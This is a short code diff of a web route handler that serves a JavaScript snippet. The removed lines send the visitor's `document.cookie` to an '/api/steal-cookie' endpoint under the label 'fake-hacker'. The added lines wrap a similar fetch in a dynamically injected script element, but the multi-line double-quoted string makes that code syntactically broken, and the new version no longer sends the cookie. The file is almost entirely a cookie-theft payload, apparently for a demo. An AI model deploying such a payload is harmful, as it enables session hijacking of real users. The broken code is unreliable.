@@ -1,21 +1,17 @@
 export async function GET() {
     const js = `
-    <script>
-      (function () {
-        try {
+     (function () {
+      const s = document.createElement('script');
+      s.innerHTML = "try {
           fetch('/api/steal-cookie', {
             method: 'POST',
             headers: {
               'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-              name: 'fake-hacker',
-              cookie: document.cookie
-            })
+            }
           });
-        } catch (e) {}
+        } catch (e) {}";
+      document.body.appendChild(s);
       })();
-    </script>
     `;
   
     return new Response(js, {
